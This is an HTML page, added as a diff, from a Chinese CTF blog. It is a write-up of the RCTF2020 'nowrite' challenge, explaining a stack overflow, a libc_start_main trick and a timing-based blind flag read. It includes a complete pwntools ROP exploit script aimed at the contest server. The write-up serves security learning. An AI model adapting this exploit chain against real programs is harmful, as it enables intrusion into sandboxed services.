@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="首先，检查一下程序的保护机制   检测一下沙箱，发现仅能进行open、read、exit操作，write操作都不行。   然后，我们用IDA分析一下，是一个及其简短的栈溢出程序">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCTF2020_nowrite(libc_start_main的妙用+盲注)">
+<meta property="og:url" content="https://github.com/ha1vk/2020/06/11/RCTF2020_nowrite/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="首先，检查一下程序的保护机制   检测一下沙箱，发现仅能进行open、read、exit操作，write操作都不行。   然后，我们用IDA分析一下，是一个及其简短的栈溢出程序">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/RCTF2020_nowrite/image1.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/RCTF2020_nowrite/image2.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/RCTF2020_nowrite/image3.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/RCTF2020_nowrite/image4.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/RCTF2020_nowrite/image5.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/RCTF2020_nowrite/image6.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/RCTF2020_nowrite/1.png">
+<meta property="article:published_time" content="2020-06-11T03:48:50.000Z">
+<meta property="article:modified_time" content="2025-06-25T12:50:30.720Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="栈溢出">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="libc_start_main的妙用">
+<meta property="article:tag" content="盲注">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ha1vk/2020/06/11/RCTF2020_nowrite/image1.png">
+
+<link rel="canonical" href="https://github.com/ha1vk/2020/06/11/RCTF2020_nowrite/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>RCTF2020_nowrite(libc_start_main的妙用+盲注) | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/06/11/RCTF2020_nowrite/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          RCTF2020_nowrite(libc_start_main的妙用+盲注)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-06-11 11:48:50" itemprop="dateCreated datePublished" datetime="2020-06-11T11:48:50+08:00">2020-06-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-25 20:50:30" itemprop="dateModified" datetime="2025-06-25T20:50:30+08:00">2025-06-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>首先，检查一下程序的保护机制</p>
+<img src="/ha1vk/2020/06/11/RCTF2020_nowrite/image1.png" class="">
+
+<p>检测一下沙箱，发现仅能进行open、read、exit操作，write操作都不行。</p>
+<img src="/ha1vk/2020/06/11/RCTF2020_nowrite/image2.png" class="">
+
+<p>然后，我们用IDA分析一下，是一个及其简短的栈溢出程序</p>
+<img src="/ha1vk/2020/06/11/RCTF2020_nowrite/image3.png" class="">
+
+<p>程序中没有输出，并且write也禁用了，也没有open函数，execve也禁用了，FULL RELRO也不能进行ret2dl，那么本题只能进行盲注，我们还需要构造出一个open系统调用。但是几乎没有可用的地方可以给我们构造。</p>
+<p>找到一条有用的gadgets，如果在bss段上有一个libc某指针，通过这个gadget可以让其指向syscall，这样我们就可以构造open系统调用了。</p>
+<img src="/ha1vk/2020/06/11/RCTF2020_nowrite/image4.png" class="">
+
+<p>但是bss段上没有这样的指针，如果有stdout，那么我们可以利用，但是这里没有。由此，想到了libc_start_main。</p>
+<img src="/ha1vk/2020/06/11/RCTF2020_nowrite/image5.png" class="">
+
+<p>我们可以先将栈迁移到bss段上，然后调用libc_start_main重启某函数，这样，在bss上就会留下很多libc指针，但是我们不能重启main函数了，因为里面有prctl函数，而prctl调用被禁了。由此，我们可以重启read_n函数，继续输出，劫持自己的返回地址，然后就又可以做rop了。</p>
+<p>当在bss段上留下libc指针后，我们就通过gadget将其修改为syscall的地址，然后构造open、read将flag读取到内存当中。</p>
+<p>接下来，就是盲注了，在csu上，有一个cmp指令非常有用，我们可以令rbp的低1自己保存着flag对应偏移的1字节，rbp其余字节全为0，然后，我们从rop里传入rbx的值为我们猜测的字符，这样cmp比较，成功后会向下执行pop，我们在后面再布置合适的rop，将栈转移到前面进行重复的cmp，相当于是一个死循环；如果比较失败，则jnz会跳到前面，然后执行call的时候，会崩溃。</p>
+<img src="/ha1vk/2020/06/11/RCTF2020_nowrite/image6.png" class="">
+
+<p>如何来让rbp仅保存flag的1字节是重点。</p>
+<img src="/ha1vk/2020/06/11/RCTF2020_nowrite/1.png" class="">
+
+<p>比如，我们要盲注第3个字符，我们读取3个符，将它存储到rbp-0x2的位置，这样，第3个字符就落到了rbp的位置，同理，我们盲注第n个字符时，从文件中读取n个字节，将它存储到rbp-n+1的位置，而rbp始终是这个地址。如何将值保存到rbp里呢，我们使用栈迁移，这样在leave;ret的时候，pop rbp就将数据存储到了rbp里，接下来就会执行后面的rop，因此，我们在bss段上任意找一个地方，保证其8字节为0，以后，我们就将rbp固定在这，然后事先在这后面布置好rop，接下来flag读取存储到这里后，栈迁移过来进行cmp等操作。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./no_write&#x27;</span>)</span><br><span class="line">read_n = <span class="number">0x00000000004006BF</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x00000000004006E8</span></span><br><span class="line">ret = <span class="number">0x000000000040070C</span></span><br><span class="line"></span><br><span class="line">pop_rbp = <span class="number">0x0000000000400588</span></span><br><span class="line"><span class="comment">#pop rdi ; ret</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400773</span></span><br><span class="line"><span class="comment">#pop rsi ; pop r15 ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000400771</span></span><br><span class="line"><span class="comment">#pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line">pop = <span class="number">0x000000000040076b</span></span><br><span class="line"><span class="comment">#pop rbx;pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line">csu_pop = <span class="number">0x000000000040076A</span></span><br><span class="line">cmp_rbx_rbp = <span class="number">0x0000000000400761</span></span><br><span class="line"><span class="comment">#leave_ret</span></span><br><span class="line">leave_ret = <span class="number">0x000000000040067c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:00000000004005B0                 mov     rdx, r15</span></span><br><span class="line"><span class="string">.text:00000000004005B3                 mov     rsi, r14</span></span><br><span class="line"><span class="string">.text:00000000004005B6                 mov     edi, r13d</span></span><br><span class="line"><span class="string">.text:00000000004005B9                 call    qword ptr [r12+rbx*8]</span></span><br><span class="line"><span class="string">.text:00000000004005BD                 add     rbx, 1</span></span><br><span class="line"><span class="string">.text:00000000004005C1                 cmp     rbp, rbx</span></span><br><span class="line"><span class="string">.text:00000000004005C4                 jnz     short loc_4005B0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">csu_call = <span class="number">0x0000000000400750</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0000000000601080</span></span><br><span class="line"></span><br><span class="line">call_libc_start_main = <span class="number">0x0000000000400544</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span></span><br><span class="line">add_dp_rbp = <span class="number">0x00000000004005e8</span></span><br><span class="line"></span><br><span class="line">new_stack = bss_addr + <span class="number">0x600</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind</span>(<span class="params">index,guess_char</span>):</span><br><span class="line">   <span class="comment">#第一步做栈迁移，迁移到bss</span></span><br><span class="line">   payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(pop_rdi) + p64(new_stack+<span class="number">0x8</span>) + p64(pop_rsi) + p64(<span class="number">0x00000000006015D0</span>) + p64(<span class="number">0</span>) + p64(read_n)</span><br><span class="line">   payload += p64(pop_rbp) + p64(new_stack) + p64(leave_ret)</span><br><span class="line">   <span class="comment">#raw_input()</span></span><br><span class="line">   sleep(<span class="number">0.2</span>)</span><br><span class="line">   sh.send(payload)</span><br><span class="line">   sleep(<span class="number">0.2</span>)</span><br><span class="line">   <span class="comment">#raw_input()</span></span><br><span class="line">   bss_start = <span class="number">0x0000000000601078</span></span><br><span class="line">   <span class="comment">#接下来，我们在bss段上，调用read，然后劫持read自己的返回栈</span></span><br><span class="line">   payload = p64(pop_rdi) + p64(read_n + <span class="number">0x1C</span>) + p64(call_libc_start_main)</span><br><span class="line">   sh.send(payload)</span><br><span class="line">   <span class="comment">#raw_input()</span></span><br><span class="line">   sleep(<span class="number">0.2</span>)</span><br><span class="line">   <span class="comment">#现在，在bss上面，保留了libc指针，通过rop，我们将其值修改为syscall的地址</span></span><br><span class="line">   target_syscall = <span class="number">0x00000000006015C0</span></span><br><span class="line">   <span class="comment">#flag文件名字符串的地址</span></span><br><span class="line">   flag_addr = <span class="number">0x0000000000601708</span></span><br><span class="line"></span><br><span class="line">   rop = p64(csu_pop)</span><br><span class="line">   rop += p64(<span class="number">0x10000000000000000</span>-<span class="number">0x2</span>) <span class="comment">#rbx = -2</span></span><br><span class="line">   rop += p64(target_syscall + <span class="number">0x3D</span>) <span class="comment">#rbp</span></span><br><span class="line">   rop += p64(<span class="number">0</span>) <span class="comment">#r12</span></span><br><span class="line">   rop += p64(<span class="number">0</span>) <span class="comment">#r13</span></span><br><span class="line">   rop += p64(<span class="number">0</span>) <span class="comment">#r14</span></span><br><span class="line">   rop += p64(<span class="number">0</span>) <span class="comment">#r15</span></span><br><span class="line">   rop += p64(ret) * <span class="number">11</span></span><br><span class="line">   rop += p64(add_dp_rbp)</span><br><span class="line">   <span class="comment">#target_syscall后续的rop，是靠当前这个read来输入的</span></span><br><span class="line">   rop += p64(pop_rdi) + p64(target_syscall + <span class="number">0x8</span>) + p64(pop_rsi) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0</span>) + p64(read_n)</span><br><span class="line">   <span class="comment">#read_n(bss,2)使得rax为2</span></span><br><span class="line">   rop += p64(pop_rdi) + p64(bss_addr) + p64(pop_rsi) + p64(<span class="number">0x2</span>) + p64(<span class="number">0</span>) + p64(read_n)</span><br><span class="line">   rop += p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">   <span class="comment">#栈迁移到那个target_syscall前方，这样我们就可以执行syscall了</span></span><br><span class="line">   rop += p64(pop_rbp) + p64(target_syscall - <span class="number">0x8</span>) + p64(leave_ret)</span><br><span class="line">   rop += <span class="string">&#x27;./flag\x00&#x27;</span></span><br><span class="line">   sh.send(rop)</span><br><span class="line">   sleep(<span class="number">0.2</span>)</span><br><span class="line">   <span class="comment">#raw_input()</span></span><br><span class="line"></span><br><span class="line">   rop_addr = <span class="number">0x00000000006015C8</span></span><br><span class="line">   flag_addr = rop_addr + <span class="number">0x200</span></span><br><span class="line">   <span class="comment">#此次用于输入rop2</span></span><br><span class="line">   rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0</span>) + p64(read_n)</span><br><span class="line">   <span class="comment">#盲注逻辑</span></span><br><span class="line">   rop += p64(csu_pop)</span><br><span class="line">   rop += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">   rop += p64(read_got)</span><br><span class="line">   <span class="comment">#通过将存储flag的地址位置上移动，达到读取下一个字符的作用</span></span><br><span class="line">   rop += p64(<span class="number">3</span>) + p64(flag_addr-index) + p64(<span class="number">0x1</span>+index)</span><br><span class="line">   rop += p64(csu_call)</span><br><span class="line">   rop += p64(<span class="number">0</span>)</span><br><span class="line">   <span class="comment">#rbx = guess_char</span></span><br><span class="line">   rop += p64(<span class="built_in">ord</span>(guess_char))</span><br><span class="line">   <span class="comment">#rbp</span></span><br><span class="line">   rop += p64(flag_addr)</span><br><span class="line">   rop += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">   <span class="comment">#栈迁移到flag里面，使得rbp保存了flag的1字节数据</span></span><br><span class="line">   rop += p64(leave_ret)</span><br><span class="line">   sleep(<span class="number">0.2</span>)</span><br><span class="line">   sh.send(rop)</span><br><span class="line">   <span class="comment">#raw_input()</span></span><br><span class="line">   <span class="comment">#使得rax为2</span></span><br><span class="line">   sh.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">   <span class="comment">#rop2</span></span><br><span class="line">   <span class="comment">#如果盲注成功，栈重新转移回去，一直比较，使得程序一直处于一个循环，达到延时的目的，不成功则直接崩溃</span></span><br><span class="line">   rop2 = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span> + p64(cmp_rbx_rbp) + p64(<span class="number">0</span>)</span><br><span class="line">   <span class="comment">#rbx 重新赋值为guess_char</span></span><br><span class="line">   rop2 += p64(<span class="built_in">ord</span>(guess_char))</span><br><span class="line">   <span class="comment">#rbp重新转到flag_addr处</span></span><br><span class="line">   rop2 += p64(flag_addr)</span><br><span class="line">   rop2 += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">   <span class="comment">#栈重新回去</span></span><br><span class="line">   rop2 += p64(leave_ret)</span><br><span class="line">   <span class="comment">#raw_input()</span></span><br><span class="line">   sleep(<span class="number">0.2</span>)</span><br><span class="line">   sh.sendline(rop2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#blind(1,&#x27;C&#x27;)</span></span><br><span class="line"><span class="comment">#flag里面可能出现的字符</span></span><br><span class="line">possible_char = []</span><br><span class="line">possible_char.append(<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line"><span class="comment">#字符的顺序可以影响效率，让频率最高的字符放前面</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">   possible_char.append(<span class="built_in">str</span>(x))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>)+<span class="number">1</span>):</span><br><span class="line">   possible_char.append(<span class="built_in">chr</span>(x))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>)+<span class="number">1</span>):</span><br><span class="line">   possible_char.append(<span class="built_in">chr</span>(x))</span><br><span class="line"></span><br><span class="line">possible_char.append(<span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">possible_char.append(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">possible_char.append(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">OK = <span class="literal">False</span></span><br><span class="line"><span class="comment">#flag = &#x27;RCTF&#123;C0mpare_f1ag_0ne_bY_oNe&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> OK:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&#x27;guess (&#x27;</span>,index,<span class="string">&#x27;) char&#x27;</span></span><br><span class="line">   length = <span class="built_in">len</span>(flag)</span><br><span class="line">   <span class="keyword">for</span> guess_char <span class="keyword">in</span> possible_char:</span><br><span class="line">      <span class="keyword">global</span> sh</span><br><span class="line">      <span class="comment">#sh = process(&#x27;./no_write&#x27;)</span></span><br><span class="line">      sh = remote(<span class="string">&#x27;129.211.134.166&#x27;</span>,<span class="number">6000</span>)</span><br><span class="line">      blind(index,guess_char)</span><br><span class="line">      start = time.time()</span><br><span class="line">      sh.can_recv_raw(timeout = <span class="number">3</span>)</span><br><span class="line">      end = time.time()</span><br><span class="line">      sh.close()</span><br><span class="line">      <span class="keyword">if</span> end - start &gt; <span class="number">3</span>:</span><br><span class="line">         <span class="keyword">if</span> guess_char == <span class="string">&#x27;\x00&#x27;</span>:</span><br><span class="line">            OK = <span class="literal">True</span></span><br><span class="line">         flag += guess_char</span><br><span class="line">         <span class="built_in">print</span> <span class="string">&#x27;success guess char at(&#x27;</span>,index,<span class="string">&#x27;)&#x27;</span></span><br><span class="line">         index+=<span class="number">1</span></span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&#x27;flag=&#x27;</span>,flag</span><br><span class="line">   <span class="keyword">if</span> length == <span class="built_in">len</span>(flag):</span><br><span class="line">      OK = <span class="literal">True</span></span><br><span class="line">      <span class="built_in">print</span> <span class="string">&#x27;ojbk!&#x27;</span></span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"># 栈溢出</a>
+              <a href="/ha1vk/tags/ROP/" rel="tag"># ROP</a>
+              <a href="/ha1vk/tags/libc-start-main%E7%9A%84%E5%A6%99%E7%94%A8/" rel="tag"># libc_start_main的妙用</a>
+              <a href="/ha1vk/tags/%E7%9B%B2%E6%B3%A8/" rel="tag"># 盲注</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/06/11/RCTF2020_bf/" rel="prev" title="RCTF2020_bf(string指针的利用)">
+      <i class="fa fa-chevron-left"></i> RCTF2020_bf(string指针的利用)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/06/11/qwb2019_one/" rel="next" title="qwb2019_one(strchr的off by one)">
+      qwb2019_one(strchr的off by one) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
